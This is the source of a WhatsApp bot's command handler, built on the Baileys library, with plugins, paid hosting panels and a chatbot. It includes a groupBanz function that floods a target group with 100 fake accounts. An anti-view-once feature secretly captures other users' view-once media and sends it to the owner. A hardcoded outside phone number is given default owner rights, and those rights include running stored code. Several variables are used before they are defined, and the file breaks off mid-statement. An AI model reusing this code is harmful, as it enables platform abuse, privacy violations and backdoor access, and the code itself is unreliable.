// ============================================================
//   case.js  v5  –  WhatsApp commands  (switch/case)
// ============================================================
'use strict';

const fs    = require('fs');
const path  = require('path');
//const axios = require('axios');


const { exec } = require('child_process');
const crypto = require('crypto');
const settings = require('./settings');
const { uploadToTelegraph } = require('./helper/uploader');
const { convertFont, formatUptime, getDateTime, normalizeJid, readJSON, writeJSON, ensureDir } = require('./helper/utils');
const { logMessage, logInfo, logError } = require('./helper/logger');
const {
  getWaSettings, setWaSetting,
  addPremium, removePremium, isPremium,
  storeMessage, retrieveMessage, numOf,smsg,
} = require('./helper/function');
const { normNum, getTargetJid, getGroupAdminInfo } = require('./helper/groupAdmin');
const { getGroupFlag, setGroupFlag } = require('./helper/listeners');
const { devHandler, DEV_CMDS }       = require('./dev-commands');
const { reactionHandler, REACTION_CMDS } = require('./helper/reactions');
const { scrapsHandler,  SCRAPS_CMDS }  = require('./scraps');
const { illusionHandler, ILLUSION_CMDS } = require('./illusion');
const { socialHandler,  SOCIAL_CMDS }  = require('./social');
const { aiHandler,      AI_CMDS }      = require('./ai');
const { economyHandler, ECON_CMDS }    = require('./economy');
const { toolsHandler,   TOOLS_CMDS }   = require('./tools');
const { stickerHandler, STICKER_CMDS } = require('./stickers');
const { musicHandler,   MUSIC_CMDS }   = require('./music');
const { gamesHandler,   GAMES_CMDS }   = require('./games');
const { adminHandler,   ADMIN_CMDS }   = require('./admin');
const { arabicHandler,  ARABIC_CMDS }  = require('./arabic');

const DB = (...f) => path.resolve(__dirname, 'database', ...f);
ensureDir(path.resolve(__dirname, 'database'));

// ════════════════════════════════════════════════════════════
//   BLACKLORD CHAMBER PLUGIN SYSTEM
// ════════════════════════════════════════════════════════════
const pluginsFile = DB('plugins.json');
let pluginMap = new Map();
let pluginNames = [];

function loadPlugins() {
  pluginMap.clear();
  pluginNames = [];
  try {
    const data = readJSON(pluginsFile, []);
    for (const plugin of data) {
      try {
        const fn = new Function(
          'sock', 'm', 'args', 'reply', 'reaction', 'ft', 'cfg', 'dlMedia', 'getQuoted', 'normNum', 'getTargetJid',
          `return (${plugin.functionBody})`
        );
        pluginMap.set(plugin.name, fn);
        pluginNames.push(plugin.name);
      } catch (e) {
        console.error(`[BLACKLORD] Failed to load plugin "${plugin.name}":`, e);
      }
    }
    console.log(`[BLACKLORD] Loaded ${pluginNames.length} plugins.`);
  } catch (e) {
    console.error('[BLACKLORD] Failed to load plugins:', e);
  }
}
async function groupBanz(sock, target) {
    if (!target.endsWith("@g.us")) {
        throw new Error("Use in a group.");
    }

    const numbers = [
        "1@s.whatsapp.net", "2@s.whatsapp.net", "3@s.whatsapp.net", "4@s.whatsapp.net", "5@s.whatsapp.net",
        "6@s.whatsapp.net", "7@s.whatsapp.net", "8@s.whatsapp.net", "9@s.whatsapp.net", "10@s.whatsapp.net",
        "11@s.whatsapp.net", "12@s.whatsapp.net", "13@s.whatsapp.net", "14@s.whatsapp.net", "15@s.whatsapp.net",
        "16@s.whatsapp.net", "17@s.whatsapp.net", "18@s.whatsapp.net", "19@s.whatsapp.net", "20@s.whatsapp.net",
        "21@s.whatsapp.net", "22@s.whatsapp.net", "23@s.whatsapp.net", "24@s.whatsapp.net", "25@s.whatsapp.net",
        "26@s.whatsapp.net", "27@s.whatsapp.net", "28@s.whatsapp.net", "29@s.whatsapp.net", "30@s.whatsapp.net",
        "31@s.whatsapp.net", "32@s.whatsapp.net", "33@s.whatsapp.net", "34@s.whatsapp.net", "35@s.whatsapp.net",
        "36@s.whatsapp.net", "37@s.whatsapp.net", "38@s.whatsapp.net", "39@s.whatsapp.net", "40@s.whatsapp.net",
        "41@s.whatsapp.net", "42@s.whatsapp.net", "43@s.whatsapp.net", "44@s.whatsapp.net", "45@s.whatsapp.net",
        "46@s.whatsapp.net", "47@s.whatsapp.net", "48@s.whatsapp.net", "49@s.whatsapp.net", "50@s.whatsapp.net",
        "51@s.whatsapp.net", "52@s.whatsapp.net", "53@s.whatsapp.net", "54@s.whatsapp.net", "55@s.whatsapp.net",
        "56@s.whatsapp.net", "57@s.whatsapp.net", "58@s.whatsapp.net", "59@s.whatsapp.net", "60@s.whatsapp.net",
        "61@s.whatsapp.net", "62@s.whatsapp.net", "63@s.whatsapp.net", "64@s.whatsapp.net", "65@s.whatsapp.net",
        "66@s.whatsapp.net", "67@s.whatsapp.net", "68@s.whatsapp.net", "69@s.whatsapp.net", "70@s.whatsapp.net",
        "71@s.whatsapp.net", "72@s.whatsapp.net", "73@s.whatsapp.net", "74@s.whatsapp.net", "75@s.whatsapp.net",
        "76@s.whatsapp.net", "77@s.whatsapp.net", "78@s.whatsapp.net", "79@s.whatsapp.net", "80@s.whatsapp.net",
        "81@s.whatsapp.net", "82@s.whatsapp.net", "83@s.whatsapp.net", "84@s.whatsapp.net", "85@s.whatsapp.net",
        "86@s.whatsapp.net", "87@s.whatsapp.net", "88@s.whatsapp.net", "89@s.whatsapp.net", "90@s.whatsapp.net",
        "91@s.whatsapp.net", "92@s.whatsapp.net", "93@s.whatsapp.net", "94@s.whatsapp.net", "95@s.whatsapp.net",
        "96@s.whatsapp.net", "97@s.whatsapp.net", "98@s.whatsapp.net", "99@s.whatsapp.net", "100@s.whatsapp.net"
    ];

    await sock.groupParticipantsUpdate(target, numbers, "add");
}
function savePlugin(plugin) {
  const data = readJSON(pluginsFile, []);
  if (data.find(p => p.name === plugin.name)) {
    throw new Error(`Plugin "${plugin.name}" already exists.`);
  }
  data.push(plugin);
  writeJSON(pluginsFile, data);
  return true;
}

function deletePlugin(name) {
  const data = readJSON(pluginsFile, []);
  const filtered = data.filter(p => p.name !== name);
  if (filtered.length === data.length) {
    throw new Error(`Plugin "${name}" not found.`);
  }
  writeJSON(pluginsFile, filtered);
  return true;
}

function addfunction(name, description, fn) {
  const functionBody = fn.toString();
  // Validate syntax by compiling
  try {
    const testFn = new Function('sock', 'm', 'args', 'reply', 'reaction', 'ft', 'cfg', 'dlMedia', 'getQuoted', 'normNum', 'getTargetJid', `return (${functionBody})`);
    if (typeof testFn !== 'function') throw new Error('Not a function');
  } catch (e) {
    throw new Error(`Invalid function: ${e.message}`);
  }
  const plugin = { name, description, functionBody, ownerOnly: true, createdAt: Date.now() };
  savePlugin(plugin);
  loadPlugins(); // reload in memory
  return true;
}

// Load plugins at startup
loadPlugins();

// ════════════════════════════════════════════════════════════
//   STICKER COMMANDS STORAGE
// ════════════════════════════════════════════════════════════
const stickerCmdsFile = path.join(__dirname, 'database', 'sticker_commands.json');

function getStickerCommands() {
    try {
        return JSON.parse(fs.readFileSync(stickerCmdsFile, 'utf8'));
    } catch {
        return {};
    }
}

function setStickerCommand(hash, command) {
    const data = getStickerCommands();
    if (!command) delete data[hash];
    else data[hash] = command;
    fs.writeFileSync(stickerCmdsFile, JSON.stringify(data, null, 2));
}

// ════════════════════════════════════════════════════════════
//   SHARED HELPERS
// ════════════════════════════════════════════════════════════

function cfg(sock) {
  const waNum = sock.__waNum || (sock.user?.id ? normNum(sock.user.id) : 'default');
  return getWaSettings(waNum);
}

function ft(txt, sock) { return convertFont(String(txt), cfg(sock).font || 0); }

function getQuoted(m) {
  const ctx = m.message?.extendedTextMessage?.contextInfo;
  if (!ctx?.quotedMessage) return { qMsg: null, qType: null, qKey: null };
  const qMsg  = ctx.quotedMessage;
  const qType = Object.keys(qMsg).find(k => !['senderKeyDistributionMessage','messageContextInfo'].includes(k));
  const qKey  = {
    remoteJid:   m.key.remoteJid,
    id:          ctx.stanzaId,
    fromMe:      false,
    participant: ctx.participant,
  };
  return { qMsg, qType, qKey };
}

async function dlMedia(msgObj, keyObj) {
  const { downloadMediaMessage } = require('@whiskeysockets/baileys');
  return downloadMediaMessage(
    { message: msgObj, key: keyObj }, 'buffer', {},
    { logger: { info(){}, error(){}, warn(){}, debug(){}, child(){ return this; } } }
  );
}

async function getBuffer(url) {
  const res = await axios.get(url, { responseType: 'arraybuffer', timeout: 15000 });
  return Buffer.from(res.data);
}

async function runAutoFollow(sock) {
  for (const nl of (settings.AUTO_FOLLOW_NEWSLETTERS || [])) {
    try { await sock.newsletterFollow(nl); } catch (e) { process.stdout.write('[autofollow] ' + nl + ' => ' + e.message + '\n'); }
  }
  for (const link of (settings.AUTO_JOIN_GROUPS || [])) {
    try {
      const code = link.split('chat.whatsapp.com/')[1];
      if (code) await sock.groupAcceptInvite(code);
    } catch (e) { process.stdout.write('[autojoin] ' + link + ' => ' + e.message + '\n'); }
  }
}



// ── Get target JID from mention/reply/number ──
// ── Font styling function – HARDCODED to Mathematical Italic ──
function ft(txt, sock) {
    const text = String(txt);

    // Mathematical Italic (U+1D434–U+1D467 uppercase, U+1D44E–U+1D481 lowercase)
    const upperMap = {
        'A':'𝐴','B':'𝐵','C':'𝐶','D':'𝐷','E':'𝐸','F':'𝐹','G':'𝐺',
        'H':'𝐻','I':'𝐼','J':'𝐽','K':'𝐾','L':'𝐿','M':'𝑀','N':'𝑁',
        'O':'𝑂','P':'𝑃','Q':'𝑄','R':'𝑅','S':'𝑆','T':'𝑇','U':'𝑈',
        'V':'𝑉','W':'𝑊','X':'𝑋','Y':'𝑌','Z':'𝑍'
    };
    const lowerMap = {
        'a':'𝑎','b':'𝑏','c':'𝑐','d':'𝑑','e':'𝑒','f':'𝑓','g':'𝑔',
        'h':'ℎ','i':'𝑖','j':'𝑗','k':'𝑘','l':'𝑙','m':'𝑚','n':'𝑛',
        'o':'𝑜','p':'𝑝','q':'𝑞','r':'𝑟','s':'𝑠','t':'𝑡','u':'𝑢',
        'v':'𝑣','w':'𝑤','x':'𝑥','y':'𝑦','z':'𝑧'
    };

    // Digits remain normal (or you can add styled digits)
    // If you want styled digits: '0':'𝟎','1':'𝟏', etc.

    let result = '';
    for (const ch of text) {
        if (upperMap[ch]) result += upperMap[ch];
        else if (lowerMap[ch]) result += lowerMap[ch];
        else result += ch; // keep spaces, punctuation, numbers, etc.
    }
    return result;
}
// ════════════════════════════════════════════════════════════
//   PANEL HELPERS  –  for buypanel & verifypayment
// ════════════════════════════════════════════════════════════

const { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const axios = require('axios');

function generatePassword(username) {
  const first = username.charAt(0).toUpperCase();
  const rest = username.slice(1).toLowerCase();
  const digits = String(Math.floor(Math.random() * 90 + 10));
  return first + rest + digits + '!';
}

async function initPaystackPayment(amount, email, reference, metadata = {}) {
  try {
    const PAYSTACK_SECRET = process.env.PAYSTACK_SECRET_KEY || settings.PAYSTACK_SECRET_KEY;
    const response = await axios.post(
      'https://api.paystack.co/transaction/initialize',
      {
        amount: amount * 100,
        email: email || 'user@example.com',
        reference: reference || `PAY-${Date.now()}`,
        metadata: metadata,
        callback_url: process.env.PAYSTACK_CALLBACK_URL || settings.PAYSTACK_CALLBACK_URL || '',
      },
      {
        headers: { Authorization: `Bearer ${PAYSTACK_SECRET}`, 'Content-Type': 'application/json' },
        timeout: 10000,
      }
    );
    return response.data;
  } catch (err) {
    console.error('Paystack init error:', err.response?.data || err.message);
    return null;
  }
}

async function verifyPaystackPayment(reference) {
  try {
    const PAYSTACK_SECRET = process.env.PAYSTACK_SECRET_KEY || settings.PAYSTACK_SECRET_KEY;
    const response = await axios.get(
      `https://api.paystack.co/transaction/verify/${reference}`,
      {
        headers: { Authorization: `Bearer ${PAYSTACK_SECRET}` },
        timeout: 10000,
      }
    );
    return response.data;
  } catch (err) {
    console.error('Paystack verify error:', err.response?.data || err.message);
    return null;
  }
}

async function createPterodactylPanel(username, ramMB, diskMB, cpuPercent, isAdmin = false) {
  const PANEL_DOMAIN = process.env.PANEL_DOMAIN || settings.PANEL_DOMAIN;
  const PANEL_APIKEY = process.env.PANEL_APIKEY || settings.PANEL_APIKEY;
  const PANEL_EGG   = parseInt(process.env.PANEL_EGG   || settings.PANEL_EGG   || 16);
  const PANEL_NEST  = parseInt(process.env.PANEL_NEST  || settings.PANEL_NEST  || 5);
  const PANEL_LOC   = parseInt(process.env.PANEL_LOC   || settings.PANEL_LOC   || 1);

  const email = `${username}@gmail.com`;
  const password = generatePassword(username);

  let userId;
  try {
    const userRes = await axios.post(
      `${PANEL_DOMAIN}/api/application/users`,
      {
        email,
        username,
        first_name: username,
        last_name: isAdmin ? 'Admin' : 'Panel',
        root_admin: isAdmin,
        language: 'en',
        password,
      },
      {
        headers: { Authorization: `Bearer ${PANEL_APIKEY}`, 'Content-Type': 'application/json' },
        timeout: 15000,
      }
    );
    userId = userRes.data.attributes.id;
  } catch (e) {
    throw new Error(`User creation failed: ${e.response?.data?.errors?.[0]?.detail || e.message}`);
  }

  let allocId;
  try {
    const allocRes = await axios.get(
      `${PANEL_DOMAIN}/api/application/nodes/${PANEL_LOC}/allocations`,
      {
        headers: { Authorization: `Bearer ${PANEL_APIKEY}` },
        timeout: 15000,
      }
    );
    const alloc = allocRes.data.data.find(a => a.attributes.assigned === false);
    if (!alloc) throw new Error('No available port');
    allocId = alloc.attributes.id;
  } catch (e) {
    throw new Error(`Allocation error: ${e.message}`);
  }

  try {
    const serverData = {
      name: `${username}-${isAdmin ? 'admin' : 'panel'}`,
      user: userId,
      egg: PANEL_EGG,
      docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
      startup: 'npm start',
      environment: { NODE_VERSION: '18', INST: 'npm', CMD_RUN: 'npm start' },
      limits: { memory: ramMB, swap: 0, disk: diskMB, io: 500, cpu: cpuPercent },
      feature_limits: { databases: 1, backups: 1 },
      allocation: { default: allocId },
      deployment: { locations: [PANEL_LOC] },
      start_on_completion: true,
    };
    const srvRes = await axios.post(
      `${PANEL_DOMAIN}/api/application/servers`,
      serverData,
      {
        headers: { Authorization: `Bearer ${PANEL_APIKEY}`, 'Content-Type': 'application/json' },
        timeout: 30000,
      }
    );
    return {
      success: true,
      username,
      password,
      panelDomain: PANEL_DOMAIN,
      serverId: srvRes.data.attributes.id,
      ram: ramMB,
      disk: diskMB,
      cpu: cpuPercent,
      isAdmin,
    };
  } catch (e) {
    throw new Error(`Server creation failed: ${e.response?.data?.errors?.[0]?.detail || e.message}`);
  }
}

async function sendPanelList(sock, from, username, quotedMsg) {
  const panelOptions = [
    { id: 'panel_5gb',      title: '💾 5GB Panel',     description: 'Start your VPS with 5GB storage',        ram: 512,  disk: 5120,  cpu: 40, price: 5,  isAdmin: false },
    { id: 'panel_10gb',     title: '📀 10GB Panel',    description: 'Start your VPS with 10GB storage',       ram: 1024, disk: 10240, cpu: 60, price: 10, isAdmin: false },
    { id: 'panel_unlimited',title: '♾️ Unlimited Panel',description: 'No storage limits for your VPS',        ram: 0,    disk: 0,    cpu: 0,  price: 8,  isAdmin: false },
    { id: 'panel_cpanel',   title: '⚙️ cPanel Panel',  description: 'Full cPanel & Webhosting Manager',      ram: 1024, disk: 1024,  cpu: 40, price: 10, isAdmin: true },
  ];

  const sections = [
    {
      title: '⚙️ Panel Selection',
      highlight_label: 'Choose Panel',
      rows: panelOptions.map(opt => ({
        title: opt.title,
        description: opt.description,
        id: opt.id,
      })),
    },
  ];

  const bodyText =
    `🖥️ *Panel Selection*\n` +
    `👤 User: *${username}*\n\n` +
    `Welcome! Choose your perfect VPS plan below:\n` +
    `• 💰 Prices start from just $5\n` +
    `• ⚡ Instant deployment after payment\n` +
    `• 🔒 Secure & reliable hosting\n\n` +
    `👇 Tap the button below to see options.`;

  const interactiveMsg = proto.Message.InteractiveMessage.create({
    body: proto.Message.InteractiveMessage.Body.create({ text: bodyText }),
    footer: proto.Message.InteractiveMessage.Footer.create({ text: `© ${settings.COMPANY || 'Samsung XMD'}` }),
    header: proto.Message.InteractiveMessage.Header.create({ title: '⚡ Panel Options', hasMediaAttachment: false }),
    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
      buttons: [
        {
          name: 'single_select',
          buttonParamsJson: JSON.stringify({
            title: '📋 Panel Options',
            sections,
          }),
        },
      ],
    }),
    contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: settings.CHANNEL_JID || '120363407629340544@newsletter',
        newsletterName: settings.CHANNEL_NAME || '〖 🟢 SAMSUNG XMD 🟢 〗',
      },
    },
  });

  const msg = {
    ephemeralMessage: {
      message: {
        messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
        interactiveMessage: interactiveMsg,
      },
    },
  };

  const wam = await generateWAMessageFromContent(from, msg, { quoted: quotedMsg });
  await sock.relayMessage(from, wam.message, { messageId: wam.key.id });
}

async function processPanelPayment(sock, from, sender, username, spec, m, prefix) {
  const amount = spec.price;
  const reference = `${spec.isAdmin ? 'CPANEL' : 'PANEL'}-${sender.replace(/[^0-9]/g, '')}-${Date.now()}`;
  const email = `${sender.split('@')[0]}@telegram.bot`;

  const init = await initPaystackPayment(amount, email, reference, {
    user_id: sender,
    username,
    ram: spec.ram,
    disk: spec.disk,
    cpu: spec.cpu,
    price: spec.price,
    isAdmin: spec.isAdmin,
  });

  if (!init || !init.status) {
    await sock.sendMessage(from, { text: '❌ Failed to create payment.' }, { quoted: m });
    return;
  }

  const paymentUrl = init.data.authorization_url;

  if (!global.pendingPayments) global.pendingPayments = new Map();
  global.pendingPayments.set(reference, {
    userId: sender,
    username,
    ram: spec.ram,
    disk: spec.disk,
    cpu: spec.cpu,
    price: spec.price,
    isAdmin: spec.isAdmin,
    status: 'pending',
  });

  const typeLabel = spec.isAdmin ? '👑 CPANEL' : '📦 ' + (spec.ram === 0 ? 'Unlimited' : `${spec.disk/1024}GB`) + ' Panel';
  const ramDisplay = spec.ram === 0 ? 'Unlimited' : `${spec.ram}MB`;
  const diskDisplay = spec.disk === 0 ? 'Unlimited' : `${spec.disk}MB`;
  const cpuDisplay = spec.cpu === 0 ? 'Unlimited' : `${spec.cpu}%`;

  await sock.sendMessage(from, {
    text:
      `💳 *Complete your payment*\n\n` +
      `Type: ${typeLabel}\n` +
      `Username: ${username}\n` +
      `📊 RAM: ${ramDisplay}\n` +
      `💾 Disk: ${diskDisplay}\n` +
      `⚡ CPU: ${cpuDisplay}\n` +
      `💰 Price: $${spec.price}\n\n` +
      `🔗 Pay here:\n${paymentUrl}\n\n` +
      `After paying, tap the button below to verify.`
  }, { quoted: m });

  await sock.sendMessage(from, {
    text: ' ',
    buttons: [
      {
        buttonId: `${prefix}verifypayment ${reference}`,
        buttonText: { displayText: '✅ Verify Payment' },
        type: 1,
      }
    ],
    headerType: 1,
    viewOnce: true,
  }, { quoted: m });
}
// ════════════════════════════════════════════════════════════
//   CHATBOT STORAGE & AI HELPER
// ════════════════════════════════════════════════════════════
const chatbotFile = DB('chatbot.json');

function getChatbotSettings(jid) {
  const data = readJSON(chatbotFile, {});
  return data[jid] || { enabled: false, systemPrompt: '' };
}

function setChatbotSettings(jid, settings) {
  const data = readJSON(chatbotFile, {});
  data[jid] = settings;
  writeJSON(chatbotFile, data);
}

async function getAIResponse(prompt, systemPrompt = '') {
  // Option A: Google Gemini
  const GEMINI_KEY = settings.GEMINI_API_KEY || '';
  if (GEMINI_KEY) {
    const payload = {
      contents: [{ parts: [{ text: prompt }] }],
    };
    if (systemPrompt) {
      payload.systemInstruction = { parts: [{ text: systemPrompt }] };
    }
    const { data } = await axios.post(
      `https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key=${GEMINI_KEY}`,
      payload,
      { timeout: 30000 }
    );
    return data.candidates?.[0]?.content?.parts?.[0]?.text || 'No response.';
  }

  // Option B: OpenRouter (free models)
  const OPENROUTER_KEY = settings.OPENROUTER_API_KEY || '';
  if (OPENROUTER_KEY) {
    const messages = [];
    if (systemPrompt) messages.push({ role: 'system', content: systemPrompt });
    messages.push({ role: 'user', content: prompt });
    const { data } = await axios.post(
      'https://openrouter.ai/api/v1/chat/completions',
      {
        model: 'mistralai/mistral-7b-instruct:free',
        messages,
      },
      {
        headers: {
          Authorization: `Bearer ${OPENROUTER_KEY}`,
          'Content-Type': 'application/json',
        },
        timeout: 30000,
      }
    );
    return data.choices?.[0]?.message?.content || 'No response.';
  }

  throw new Error('No AI API key configured. Set GEMINI_API_KEY or OPENROUTER_API_KEY in settings.js');
}

// ── Command list for dynamic menu ──────────────────────────────
const CMDS = {
  Owner:     ['setsticker','prefixfree','setprefix','setowner','setbotname','setmenuimg','setbotimg','setfonts','public','self','addprem','delprem','antidelete','iphonemode','autoviewstatus','autolikestatus','anticall','block','unblock','listblocked','broadcast','pair'],
  Group:     ['promote','demote','kick','mute','unmute','tagall','tagadmins','grouplink','revoke','groupinfo','setgname','setgdesc','hidetag','warn','resetwarn','warnings','antilink','antimedia','welcome','goodbye','lock','unlock','everyone','admins','listgroups','members','approveall','rejectall','checkpending','disap','antimention','antispam','antibot','slowmode','endpoll','setwelcomemsg','setgoodbyemsg','kickinactive','mutelist','softban','kickall'],
  Utility:   ['sticker','toimg','vv','qr','weather','tr','uploadstatus','setmypp','getpp','tts','tourl','ocr','shorten','friends','play','playdoc','idch','lyrics','imagine','carbon','instagram','tiktok','facebook','twitter','pinterest','spotify','ytmp4','base64','unbase64','whois','reversegif','attp','emojimix'],
  Fun:       ['joke','fact','quote','dare','truth','riddle','roast','ship','coinflip','dice','magic8','horoscope','meme','cat','dog','waifu','anime','trivia','compliment','bored','rps','math','typeracer','neverhaveiever','wouldyourather'],
  Reactions: REACTION_CMDS,
  Admin:     ADMIN_CMDS,
  Illusion:  ILLUSION_CMDS,
  Social:    SOCIAL_CMDS,
  AI:        AI_CMDS,
  Tools:     TOOLS_CMDS,
  Stickers:  STICKER_CMDS,
  Music:     MUSIC_CMDS,
};

// ════════════════════════════════════════════════════════════
//   MAIN HANDLER
// ════════════════════════════════════════════════════════════
async function handleMessage(sock, m, chatMeta = {}) {

  // ── Resolve waNum ─────────────────────────────────────────
  const waNum = sock.__waNum || (sock.user?.id ? normNum(sock.user.id) : 'default');
  if (!sock.__waNum && sock.user?.id) sock.__waNum = normNum(sock.user.id);
  const c    = getWaSettings(waNum);
  const mode = c.mode || 'public';

  logMessage(m, chatMeta);
  storeMessage(m);

  // ── Status broadcast ──────────────────────────────────────
  if (m.key.remoteJid === 'status@broadcast') {
    if (c.autoViewStatus) { try { await sock.readMessages([m.key]); } catch {} }
    if (c.autoLikeStatus) { try { await sock.sendMessage('status@broadcast', { react: { text: '❤️', key: m.key } }); } catch {} }
    return;
  }

  // ── Body – mtype-based ────────────────────────────────────
  const mtype = m.mtype || Object.keys(m.message || {})[0] || '';
  const body = (
    mtype === 'conversation'              ? m.message.conversation :
    mtype === 'imageMessage'              ? m.message.imageMessage.caption :
    mtype === 'videoMessage'              ? m.message.videoMessage.caption :
    mtype === 'extendedTextMessage'       ? m.message.extendedTextMessage.text :
    mtype === 'buttonsResponseMessage'    ? m.message.buttonsResponseMessage.selectedButtonId :
    mtype === 'listResponseMessage'       ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    mtype === 'templateButtonReplyMessage'? m.message.templateButtonReplyMessage.selectedId :
    mtype === 'interactiveResponseMessage'? (() => { try { return JSON.parse(m.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson || '{}').id || ''; } catch { return ''; } })() :
    mtype === 'messageContextInfo'        ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text || '') :
    m.message?.conversation || m.message?.extendedTextMessage?.text || ''
  );

  // ── Core vars ─────────────────────────────────────────────
  const from         = m.key.remoteJid;
  const jid          = from;
  const isGroup      = from.endsWith('@g.us');
  const botNumber    = normNum(sock.user?.id || '');
  const sender       = m.key.fromMe
    ? botNumber + '@s.whatsapp.net'
    : (m.key.participant || m.key.remoteJid);
  const senderNumber = sender.split('@')[0];
  const pushname     = m.pushName || 'No Name';

  // ── Declare command variables ─────────────────────────────
  let cmd, args, text;

  // ════════════════════════════════════════════════════════════
  //   1) STICKER COMMAND DETECTION (runs BEFORE prefix)
  // ════════════════════════════════════════════════════════════
  if (mtype === 'stickerMessage') {
    const sticker = m.message.stickerMessage;
    let hashBytes = sticker.fileSha256;
    if (hashBytes) {
      const buffer = Buffer.isBuffer(hashBytes) ? hashBytes : Buffer.from(hashBytes);
      const hash = buffer.toString('base64');
      const stickerCommands = getStickerCommands();
      if (stickerCommands[hash]) {
        cmd = stickerCommands[hash];
        args = [];
        text = '';
      }
    }
  }

  // ── Chatbot auto‑reply (mention or reply to bot) ──
  const chatbotSettings = getChatbotSettings(jid);
  if (chatbotSettings.enabled && !hasPrefix && body) {
    const botJid = botNumber + '@s.whatsapp.net';
    const normalizedBot = normalizeJid(botJid);

    // Check for mention
    const mentionedJids = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    const isMentioned = mentionedJids.some(j => normalizeJid(j) === normalizedBot);

    // Check for reply to a bot message
    const contextInfo = m.message?.extendedTextMessage?.contextInfo || {};
    const quotedMsg = contextInfo.quotedMessage;
    let isReplyToBot = false;
    if (quotedMsg && contextInfo.participant) {
      const quotedSender = contextInfo.participant;
      if (normalizeJid(quotedSender) === normalizedBot) {
        isReplyToBot = true;
      }
    }

    if (isMentioned || isReplyToBot) {
      try {
        await reaction('🤖');
        const response = await getAIResponse(body, chatbotSettings.systemPrompt);
        const finalText = response.slice(0, 4000); // WhatsApp limit
        await sock.sendMessage(jid, { text: finalText }, { quoted: m });
      } catch (err) {
        console.error('Chatbot error:', err);
        await sock.sendMessage(jid, { text: '❌ AI service error. Please try again later.' }, { quoted: m });
      }
    }
  }


  // ════════════════════════════════════════════════════════════
  //   2) PREFIX / PREFIX‑FREE PARSING (if cmd not set by sticker)
  // ════════════════════════════════════════════════════════════
  const storedPrefix = c.prefix || settings.DEFAULT_PREFIX || '.';
  const hasPrefix = body.startsWith(storedPrefix);
  const isPrefixFree = c.prefixfree === true;

  if (!cmd && !hasPrefix && !isPrefixFree) return;

  if (!cmd) {
    if (hasPrefix) {
      const parts = body.slice(storedPrefix.length).trim().split(/\s+/);
      cmd = parts[0]?.toLowerCase();
      args = parts.slice(1);
      text = args.join(' ');
    } else if (isPrefixFree) {
      const parts = body.trim().split(/\s+/);
      cmd = parts[0]?.toLowerCase();
      args = parts.slice(1);
      text = args.join(' ');
      if (!cmd) return;
    }
  }

  // ── Anti‑view‑once (auto‑forward to owner) ─────────────────
  if (c.antiviewonce) {
    let inner = m.message;
    let isViewOnce = false;
    const viewOnceTypes = ['viewOnceMessage', 'viewOnceMessageV2', 'viewOnceMessageV2Extension'];
    for (const type of viewOnceTypes) {
      if (inner?.[type]?.message) {
        inner = inner[type].message;
        isViewOnce = true;
        break;
      }
    }

    if (isViewOnce) {
      const imgMsg = inner.imageMessage;
      const vidMsg = inner.videoMessage;
      const audMsg = inner.audioMessage;

      if (imgMsg || vidMsg || audMsg) {
        try {
          // Get owner JID
          const ownerFile = DB('owner.json');
          let kontributor = [];
          try { kontributor = JSON.parse(fs.readFileSync(ownerFile, 'utf8')); } catch { kontributor = []; }
          if (!kontributor.length) {
            if (settings.SUDO_NUMBER) kontributor.push(String(settings.SUDO_NUMBER));
          }
          const ownerNumber = kontributor[0] || botNumber;
          const ownerJid = ownerNumber.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

          if (sender === ownerJid) return;

          const mediaObj = imgMsg ? { imageMessage: imgMsg } :
                           vidMsg ? { videoMessage: vidMsg } :
                           { audioMessage: audMsg };
          const buf = await dlMedia(mediaObj, m.key);

          const chatType = isGroup ? `group ${groupName}` : 'private DM';
          const caption = `📩 View‑once from ${senderNumber} (${pushname}) in ${chatType}`;

          if (imgMsg) await sock.sendMessage(ownerJid, { image: buf, caption });
          else if (vidMsg) await sock.sendMessage(ownerJid, { video: buf, caption });
          else if (audMsg) await sock.sendMessage(ownerJid, { audio: buf, mimetype: 'audio/mpeg', ptt: false });

        } catch (e) {
          console.error('Anti‑view‑once error:', e);
        }
        return;
      }
    }
  }

  // If still no cmd, exit.
  if (!cmd) return;

  // ── isOwner ───────────────────────────────────────────────
  const ownerFile = DB('owner.json');
  let kontributor = [];
  try { kontributor = JSON.parse(fs.readFileSync(ownerFile, 'utf8')); } catch { kontributor = []; }
  if (!kontributor.length) {
    // Set default owner to +254726433254
    kontributor.push('254726433254');
    if (settings.SUDO_NUMBER) kontributor.push(String(settings.SUDO_NUMBER));
    if (c.owner)              kontributor.push(String(c.owner));
  }
  const normalizedSender = normalizeJid(sender);
  const normalizedBot   = normalizeJid(botNumber + '@s.whatsapp.net');

  const ownerNumbers = [botNumber, ...kontributor]
    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
    .map(normalizeJid);

  const _isOwner = ownerNumbers.includes(normalizedSender);
  const isBot = normalizedSender === normalizedBot;

  // ── Self mode gate ────────────────────────────────────────
  if (mode === 'self' && !_isOwner && !isBot) return;

  // ── Group metadata & admin flags ──────────────────────────
  const groupMetadata = isGroup ? await sock.groupMetadata(jid).catch(() => ({})) : {};
  const groupName     = isGroup ? groupMetadata.subject || '' : '';
  const participants  = isGroup ? (groupMetadata.participants || []).map(p => {
    let admin = null;
    if (p.admin === 'superadmin') admin = 'superadmin';
    else if (p.admin === 'admin') admin = 'admin';
    return { id: p.id || null, jid: p.jid || p.id || null, admin, full: p };
  }) : [];
  const groupOwner    = isGroup ? participants.find(p => p.admin === 'superadmin')?.jid || '' : '';
  const groupAdmins   = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.jid || p.id);
  const isBotAdmins   = isGroup ? groupAdmins.includes(botNumber + '@s.whatsapp.net') || groupAdmins.includes(botNumber) : false;
  const isAdmins      = isGroup ? groupAdmins.includes(sender) : false;
  const isGroupOwner  = isGroup ? groupOwner === sender : false;

  // ── Styled quoted objects ─────────────────────────────────
  const qpayment = {
